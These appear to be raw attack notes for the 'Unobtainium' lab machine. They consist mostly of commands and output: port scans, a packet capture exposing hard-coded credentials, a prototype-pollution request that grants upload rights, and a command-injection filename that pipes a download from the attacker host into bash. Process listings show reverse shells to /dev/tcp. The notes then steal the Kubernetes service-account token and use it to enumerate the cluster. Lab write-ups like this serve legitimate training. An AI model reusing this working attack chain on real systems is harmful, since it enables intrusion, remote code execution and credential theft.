$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.235

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10250/tcp open  unknown
10256/tcp open  unknown
31337/tcp open  Elite

$ nmap -oN nmap-tcp -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV -v 10.10.10.235

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T07:10:30
| Not valid after:  2022-01-17T07:10:30
| MD5:   bf49 c77d 7900 011e 603c 26f5 9620 af5d
|_SHA-1: 3ad8 d245 3655 0459 3cae 0454 0992 b85d c7ca 7531
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T07:10:30
| Not valid after:  2022-01-17T07:10:30
| MD5:   f920 4337 4559 aad2 fd5c 41bf 0b9c 827c
|_SHA-1: 729f 3481 33c5 eaba 5922 1b34 8bb8 e052 a107 a521
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Tue, 13 Apr 2021 07:02:44 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Tue, 13 Apr 2021 07:02:40 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Tue, 13 Apr 2021 07:02:41 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Issuer: commonName=minikubeCA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T20:38:55
| Not valid after:  2022-04-12T20:38:55
| MD5:   785b 289d f390 741b b028 b99e 67db 3ff0
|_SHA-1: 37d4 22f4 d956 c4f2 61bf ad39 3ff7 6b2f 37ec 97f9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Issuer: commonName=unobtainium-ca@1610865428
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T05:37:08
| Not valid after:  2022-01-17T05:37:08
| MD5:   fa5f 3f5c 5f93 30d2 5105 2aad 71a4 96f6
|_SHA-1: d67f 5a73 83b7 2393 1612 e88a 12c5 6bf1 9552 36b3
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31337/tcp open  http             Node.js Express framework
| http-methods: 
|   Supported Methods: GET HEAD PUT DELETE POST OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

---

$ sudo dpkg -i unobtainium_1.0.0_amd64.deb

$ sudo tcpdump -i tun0 -nn -s0 -vv -XX

07:41:31.500597 IP (tos 0x0, ttl 64, id 51, offset 0, flags [DF], proto TCP (6), length 518)
    10.10.14.11.36686 > 10.10.10.235.31337: Flags [P.], cksum 0xc226 (correct), seq 1:467, ack 1, win 502, options [nop,nop,TS val 275436911 ecr 2826067450], length 466
	0x0000:  4500 0206 0033 4000 4006 0bb6 0a0a 0e0b  E....3@.@.......
	0x0010:  0a0a 0aeb 8f4e 7a69 ca14 e324 13da 14f8  .....Nzi...$....
	0x0020:  8018 01f6 c226 0000 0101 080a 106a d56f  .....&.......j.o
	0x0030:  a872 5dfa 5055 5420 2f20 4854 5450 2f31  .r].PUT./.HTTP/1
	0x0040:  2e31 0d0a 486f 7374 3a20 756e 6f62 7461  .1..Host:.unobta
	0x0050:  696e 6975 6d2e 6874 623a 3331 3333 370d  inium.htb:31337.
	0x0060:  0a43 6f6e 6e65 6374 696f 6e3a 206b 6565  .Connection:.kee
	0x0070:  702d 616c 6976 650d 0a43 6f6e 7465 6e74  p-alive..Content
	0x0080:  2d4c 656e 6774 683a 2037 380d 0a41 6363  -Length:.78..Acc
	0x0090:  6570 743a 2061 7070 6c69 6361 7469 6f6e  ept:.application
	0x00a0:  2f6a 736f 6e2c 2074 6578 742f 6a61 7661  /json,.text/java
	0x00b0:  7363 7269 7074 2c20 2a2f 2a3b 2071 3d30  script,.*/*;.q=0
	0x00c0:  2e30 310d 0a55 7365 722d 4167 656e 743a  .01..User-Agent:
	0x00d0:  204d 6f7a 696c 6c61 2f35 2e30 2028 5831  .Mozilla/5.0.(X1
	0x00e0:  313b 204c 696e 7578 2078 3836 5f36 3429  1;.Linux.x86_64)
	0x00f0:  2041 7070 6c65 5765 624b 6974 2f35 3337  .AppleWebKit/537
	0x0100:  2e33 3620 284b 4854 4d4c 2c20 6c69 6b65  .36.(KHTML,.like
	0x0110:  2047 6563 6b6f 2920 756e 6f62 7461 696e  .Gecko).unobtain
	0x0120:  6975 6d2f 312e 302e 3020 4368 726f 6d65  ium/1.0.0.Chrome
	0x0130:  2f38 372e 302e 3432 3830 2e31 3431 2045  /87.0.4280.141.E
	0x0140:  6c65 6374 726f 6e2f 3131 2e32 2e30 2053  lectron/11.2.0.S
	0x0150:  6166 6172 692f 3533 372e 3336 0d0a 436f  afari/537.36..Co
	0x0160:  6e74 656e 742d 5479 7065 3a20 6170 706c  ntent-Type:.appl
	0x0170:  6963 6174 696f 6e2f 6a73 6f6e 0d0a 4163  ication/json..Ac
	0x0180:  6365 7074 2d45 6e63 6f64 696e 673a 2067  cept-Encoding:.g
	0x0190:  7a69 702c 2064 6566 6c61 7465 0d0a 4163  zip,.deflate..Ac
	0x01a0:  6365 7074 2d4c 616e 6775 6167 653a 2065  cept-Language:.e
	0x01b0:  6e2d 5553 0d0a 0d0a 7b22 6175 7468 223a  n-US....{"auth":
	0x01c0:  7b22 6e61 6d65 223a 2266 656c 616d 6f73  {"name":"felamos
	0x01d0:  222c 2270 6173 7377 6f72 6422 3a22 5769  ","password":"Wi
	0x01e0:  6e74 6572 3230 3231 227d 2c22 6d65 7373  nter2021"},"mess
	0x01f0:  6167 6522 3a7b 2274 6578 7422 3a22 6865  age":{"text":"he
	0x0200:  6c6c 6f22 7d7d                           llo"}}

PUT / HTTP/1.1
Host: unobtainium.htb:31337
{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"hello"}}

07:49:46.506329 IP (tos 0x0, ttl 64, id 16024, offset 0, flags [DF], proto TCP (6), length 518)
    10.10.14.11.36712 > 10.10.10.235.31337: Flags [P.], cksum 0xbb76 (correct), seq 1:467, ack 1, win 502, options [nop,nop,TS val 275931917 ecr 2203818142], length 466
	0x0000:  4500 0206 3e98 4000 4006 cd50 0a0a 0e0b  E...>.@.@..P....
	0x0010:  0a0a 0aeb 8f68 7a69 9c51 ef31 f320 a78e  .....hzi.Q.1....
	0x0020:  8018 01f6 bb76 0000 0101 080a 1072 630d  .....v.......rc.
	0x0030:  835b 989e 504f 5354 202f 746f 646f 2048  .[..POST./todo.H
	0x0040:  5454 502f 312e 310d 0a48 6f73 743a 2075  TTP/1.1..Host:.u
	0x0050:  6e6f 6274 6169 6e69 756d 2e68 7462 3a33  nobtainium.htb:3
	0x0060:  3133 3337 0d0a 436f 6e6e 6563 7469 6f6e  1337..Connection
	0x0070:  3a20 6b65 6570 2d61 6c69 7665 0d0a 436f  :.keep-alive..Co
	0x0080:  6e74 656e 742d 4c65 6e67 7468 3a20 3733  ntent-Length:.73
	0x0090:  0d0a 4163 6365 7074 3a20 6170 706c 6963  ..Accept:.applic
	0x00a0:  6174 696f 6e2f 6a73 6f6e 2c20 7465 7874  ation/json,.text
	0x00b0:  2f6a 6176 6173 6372 6970 742c 202a 2f2a  /javascript,.*/*
	0x00c0:  3b20 713d 302e 3031 0d0a 5573 6572 2d41  ;.q=0.01..User-A
	0x00d0:  6765 6e74 3a20 4d6f 7a69 6c6c 612f 352e  gent:.Mozilla/5.
	0x00e0:  3020 2858 3131 3b20 4c69 6e75 7820 7838  0.(X11;.Linux.x8
	0x00f0:  365f 3634 2920 4170 706c 6557 6562 4b69  6_64).AppleWebKi
	0x0100:  742f 3533 372e 3336 2028 4b48 544d 4c2c  t/537.36.(KHTML,
	0x0110:  206c 696b 6520 4765 636b 6f29 2075 6e6f  .like.Gecko).uno
	0x0120:  6274 6169 6e69 756d 2f31 2e30 2e30 2043  btainium/1.0.0.C
	0x0130:  6872 6f6d 652f 3837 2e30 2e34 3238 302e  hrome/87.0.4280.
	0x0140:  3134 3120 456c 6563 7472 6f6e 2f31 312e  141.Electron/11.
	0x0150:  322e 3020 5361 6661 7269 2f35 3337 2e33  2.0.Safari/537.3
	0x0160:  360d 0a43 6f6e 7465 6e74 2d54 7970 653a  6..Content-Type:
	0x0170:  2061 7070 6c69 6361 7469 6f6e 2f6a 736f  .application/jso
	0x0180:  6e0d 0a41 6363 6570 742d 456e 636f 6469  n..Accept-Encodi
	0x0190:  6e67 3a20 677a 6970 2c20 6465 666c 6174  ng:.gzip,.deflat
	0x01a0:  650d 0a41 6363 6570 742d 4c61 6e67 7561  e..Accept-Langua
	0x01b0:  6765 3a20 656e 2d55 530d 0a0d 0a7b 2261  ge:.en-US....{"a
	0x01c0:  7574 6822 3a7b 226e 616d 6522 3a22 6665  uth":{"name":"fe
	0x01d0:  6c61 6d6f 7322 2c22 7061 7373 776f 7264  lamos","password
	0x01e0:  223a 2257 696e 7465 7232 3032 3122 7d2c  ":"Winter2021"},
	0x01f0:  2266 696c 656e 616d 6522 3a22 746f 646f  "filename":"todo
	0x0200:  2e74 7874 227d                           .txt"}

POST /todo HTTP/1.1
Host: unobtainium.htb:31337
{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt"}

{"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"}
---

$ gobuster dir -m POST -o 31337_gobuster.txt -u http://unobtainium.htb:31337 -w /usr/share/wordlists/dirb/common.txt

/todo                 (Status: 403) [Size: 36]
/TODO                 (Status: 403) [Size: 36]
/upload               (Status: 403) [Size: 36]

---

$ dpkg-deb -x unobtainium_1.0.0_amd64.deb ./

HD={"files":{"index.js":{"size":503,"offset":"0"},"package.json":{"size":207,"offset":"503"},"src":{"files":{"get.html":{"size":3821,"offset":"710"},"index.html":{"size":3499,"offset":"4531"},"post.html":{"size":3858,"offset":"8030"},"todo.html":{"size":3799,"offset":"11888"},"js":{"files":{"Chart.min.js":{"size":173077,"offset":"15687"},"app.js":{"size":584,"offset":"188764"},"bootstrap.bundle.min.js":{"size":80821,"offset":"189348"},"check.js":{"size":431,"offset":"270169"},"dashboard.js":{"size":953,"offset":"270600"},"feather.min.js":{"size":75779,"offset":"271553"},"get.js":{"size":160,"offset":"347332"},"jquery.min.js":{"size":89476,"offset":"347492"},"todo.js":{"size":350,"offset":"436968"}}},"css":{"files":{"bootstrap.min.css":{"size":153111,"offset":"437318"},"dashboard.css":{"size":1573,"offset":"590429"}}}}}}}const {app, BrowserWindow} = require('electron')


$(document).ready(function(){
    $("#but_submit").click(function(){
        var message = $("#message").val().trim();
        $.ajax({
        url: 'http://unobtainium.htb:31337/',
        type: 'put',
        dataType:'json',
        contentType:'application/json',
        processData: false,
        data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),
        success: function(data) {
            //$("#output").html(JSON.stringify(data));
            $("#output").html("Message has been sent!");
        }
    });
});


$.ajax({
    url: 'http://unobtainium.htb:31337',
    type: 'get',
    
    success: function(data) {
        $("#output").html(JSON.stringify(data));
    }
});

$.ajax({
    url: 'http://unobtainium.htb:31337/todo',
    type: 'post',
    dataType:'json',
    contentType:'application/json',
    processData: false,
    data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}),
    success: function(data) {
        $("#output").html(JSON.stringify(data));
    }
});

---

POST /todo HTTP/1.1
Host: unobtainium.htb:31337
Content-Type: application/json
Content-Length: 73

{"auth":{"name":"felamos","password":"Winter2021"},"filename":"index.js"}


app.post('/upload', (req, res) => {
 const user = findUser(req.body.auth || {});
 if (!user || !user.canUpload) {
 res.status(403).send({ok: false, error: 'Access denied'});
 return;
 }


 filename = req.body.filename;
 root.upload(\"./\",filename, true);
 res.send({ok: true, Uploaded_File: filename});
});

---

PUT / HTTP/1.1
Host: unobtainium.htb:31337
Content-Type: application/json
Content-Length: 113

{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"hello","__proto__":{"canUpload": 1}}}

POST /upload HTTP/1.1
Host: unobtainium.htb:31337
Content-Type: application/json
Content-Length: 117

{"auth":{"name":"felamos","password":"Winter2021"},"filename":"; curl http://10.10.14.11/index.html|bash"}

---

root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# id

  uid=0(root) gid=0(root) groups=0(root)

root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# uname -a

  Linux webapp-deployment-5d764566f4-lrpt9 5.4.0-70-generic #78-Ubuntu SMP Fri Mar 19 13:29:52 UTC 2021 x86_64 GNU/Linux

root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# ls -l ~

  total 4
  -rw-r--r-- 2 root root 33 Apr 13 12:59 user.txt

root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
16: eth0@if17: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:08 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.8/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

---

root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# cat clear-kubectl
cat clear-kubectl
* * * * * find / -name kubectl -exec rm {} \;


root@webapp-deployment-5d764566f4-lrpt9:/# ps -auwwx
ps -auwwx
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.4  1.2 611448 52148 ?        Ssl  12:59   0:40 node index.js
root          16  0.0  0.0   4276   736 ?        S    14:36   0:00 /bin/sh -c gsutil -m cp -r -a public-read /usr/src/app ; curl http://10.10.14.11 | bash
root          18  0.0  0.0  17944  2840 ?        S    14:36   0:00 bash
root          19  0.0  0.0  17944  2856 ?        S    14:36   0:00 bash -c bash -i >& /dev/tcp/10.10.14.11/443 0>&1
root          20  0.0  0.0  18164  3184 ?        S    14:36   0:00 bash -i
root          24  0.0  0.0   4276   700 ?        S    14:42   0:00 /bin/sh -c gsutil -m cp -r -a public-read /usr/src/app ; curl http://10.10.14.11/index.html|bash
root          26  0.0  0.0  17944  2844 ?        S    14:42   0:00 bash
root          27  0.0  0.0  17944  2868 ?        S    14:42   0:00 /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.14.11/4444 0>&1
root          28  0.0  0.0  18172  3276 ?        S    14:42   0:00 /bin/bash -i
root          57  0.0  0.0  36632  2880 ?        R    15:22   0:00 ps -auwwx

---

root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# cat Dockerfile

  FROM node:14
  RUN apt-get update && apt-get -y install cron

  WORKDIR /usr/src/app
  COPY package*.json ./
  COPY . .
  COPY clear-kubectl /etc/cron.d/clear-kubectl
  RUN chmod 0644 /etc/cron.d/clear-kubectl
  RUN crontab /etc/cron.d/clear-kubectl
  RUN touch /var/log/cron.log
  RUN ln -s /dev/null /root/.bash_history
  RUN ln -s /dev/null /home/node/.bash_history
  RUN echo 'proc /proc proc defaults,hidepid=2 0 0' >> /etc/fstab 
  CMD cron && tail -f /var/log/cron.log
  EXPOSE 3000
  CMD [ "node", "index.js" ]

root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# find / -name "*kube*" 2>/dev/null | grep -E -v "sys|proc"

  /etc/cron.d/clear-kubectl
  /usr/src/app/clear-kubectl
  /run/secrets/kubernetes.io

<4-lrpt9:/run/secrets/kubernetes.io/serviceaccount# ls -la

  total 4
  drwxrwxrwt 3 root root  140 Apr 13 12:59 .
  drwxr-xr-x 3 root root 4096 Apr 13 12:59 ..
  drwxr-xr-x 2 root root  100 Apr 13 12:59 ..2021_04_13_12_59_29.039388979
  lrwxrwxrwx 1 root root   31 Apr 13 12:59 ..data -> ..2021_04_13_12_59_29.039388979
  lrwxrwxrwx 1 root root   13 Apr 13 12:59 ca.crt -> ..data/ca.crt
  lrwxrwxrwx 1 root root   16 Apr 13 12:59 namespace -> ..data/namespace
  lrwxrwxrwx 1 root root   12 Apr 13 12:59 token -> ..data/token

<4-lrpt9:/run/secrets/kubernetes.io/serviceaccount# cat ca.crt

  -----BEGIN CERTIFICATE-----
  MIIC5zCCAc+gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
  a3ViZUNBMB4XDTIxMDEwNzEzMjQ0OVoXDTMxMDEwNjEzMjQ0OVowFTETMBEGA1UE
  AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMTC
  j3HOO1tahMOPzd68naKhBeiaAZ3iqt/ScnegTglKmtz5DagED5YajZM+UyvPEqQ+
  u+mb1Zc1Kbrc2Fg3C48BY7OIP6GfOX990PDKJhqZtaOAdcU5Ga1avS+l3do6V2kC
  eVstwX6SVIbzGJEUxMUPiZsFt6HsvN7htP1P5gewwtgsVIXDyLl/eRfwCn2ZW+n3
  NgC4OI84zjVHpXmXFaGseDHb/E4wK/N0hMD0DEVPJsEOogHM9LndUgyJmhAtWbEj
  25+H8AwQi3/8PYNEsmtSAUEuWtY36px/sD5CthiNlNpkB5t5c1GK90DmyofqBgYv
  9wkCNGGZKp3AxMMN2nsCAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
  MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
  DQEBCwUAA4IBAQAHJjo8Uc3SH1UnsKSwZJTuyj36W/msbMr0pSn3dlE6BouukhF3
  9GxmVa2an4/VFJkAsZSqFUz1e52qvJoFJcXec4MiN6GZTWuUA9D/jqiapnHWeO8x
  RGk4WN66ZraM0X3PqaHo+cbfhKOlL9jkUxvE+3BWuj9plyD3n9tFe3lnasDfzy4M
  q465ixPZqFqVchxQFQ+pZ24KiqoQW4mam/x5FPy13+Mw8J4zb8vLduvLQR3wpUGb
  vKXdnKOLWsiExyrjpZjZbYBL8b705XFFGvmabp21aG8psB1XvsLiGFQEqyDfeFRW
  hl7KpUISl4+Np5sAiXNwtbSDE+22QVtZbuDn
  -----END CERTIFICATE-----

<4-lrpt9:/run/secrets/kubernetes.io/serviceaccount# cat token

  eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA

  
  
<4-lrpt9:/run/secrets/kubernetes.io/serviceaccount# cat namespace

  default

---

{
  "iss": "kubernetes/serviceaccount",
  "kubernetes.io/serviceaccount/namespace": "default",
  "kubernetes.io/serviceaccount/secret.name": "default-token-gv2pq",
  "kubernetes.io/serviceaccount/service-account.name": "default",
  "kubernetes.io/serviceaccount/service-account.uid": "4083b502-e4dc-4fb0-b755-64fe7ded3715",
  "sub": "system:serviceaccount:default:default"
}

$ curl -k -H "Authorization: Bearer $cookie" https://unobtainium.htb:8443/api/v1/namespaces

    {
      "metadata": {
        "name": "dev",
        "uid": "19ca6e08-c257-4230-904c-2be9ad4a640b",
        "resourceVersion": "1042",
        "creationTimestamp": "2021-01-17T18:04:07Z",
        "managedFields": [
          {
            "manager": "kubectl-create",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2021-01-17T18:04:07Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {"f:status":{"f:phase":{}}}
          }
        ]
      },
      "spec": {
        "finalizers": [
          "kubernetes"
        ]
      },
      "status": {
        "phase": "Active"
      }
    },

$ curl --silent -k -H "Authorization: Bearer $cookie" https://unobtainium.htb:8443/api/v1/namespaces/dev/pods > dev_pods

root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# curl --output kctl http://10.10.14.11/kubectl

root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# /tmp/kctl --token $token auth can-i --list
<dev/shm# /tmp/kctl --token $token auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]

root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# /tmp/kctl --namespace dev get pods

  NAME                                READY   STATUS    RESTARTS   AGE
  devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         86d
  devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         86d
  devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         86d

root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# /tmp/kctl get namespace

  NAME              STATUS   AGE
  default           Active   86d
  dev               Active   86d
  kube-node-lease   Active   86d
  kube-public       Active   86d
  kube-system       Active   86d

$ curl --silent -k -H "Authorization: Bearer $cookie" https://unobtainium.htb:8443/apis | jq -r '.groups[].name'

apiregistration.k8s.io
apps
events.k8s.io
authentication.k8s.io
authorization.k8s.io
autoscaling
batch
certificates.k8s.io
networking.k8s.io
extensions
policy
rbac.authorization.k8s.io
storage.k8s.io
admissionregistration.k8s.io
apiextensions.k8s.io
scheduling.k8s.io
coordination.k8s.io
node.k8s.io
discovery.k8s.io
flowcontrol.apiserver.k8s.io

curl --silent -k -H "Authorization: Bearer $cookie" https://unobtainium.htb:8443/openapi/v2 | jq -r '.paths | keys[]' > api_paths

$ for i in $(cat api_paths | grep -v -E "\{"); do attempt=$(curl --silent -k -H "Authorization: Bearer $cookie" https://unobtainium.htb:8443$i); if ! [[ $attempt == *"Forbidden"* ]]; then echo $i; fi; done

$ cat api_valid | grep -v -E "v1/$|v1beta1/$" > api_valid_1

root@webapp-deployment-5d764566f4-mbprj:/tmp# ./kctl --namespace dev describe pod devnode-deployment-cd86fb5c-6ms8d 
<dev describe pod devnode-deployment-cd86fb5c-6ms8d 
Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.6
IPs:
  IP:           172.17.0.6
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://bab8eef1eeb0d093cb4842093562d3f42e94a14a778e8a5766f6574eae34986e
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Tue, 13 Apr 2021 20:43:39 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 16:01:28 +0000
      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
    Ready:          True
    Restart Count:  28
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
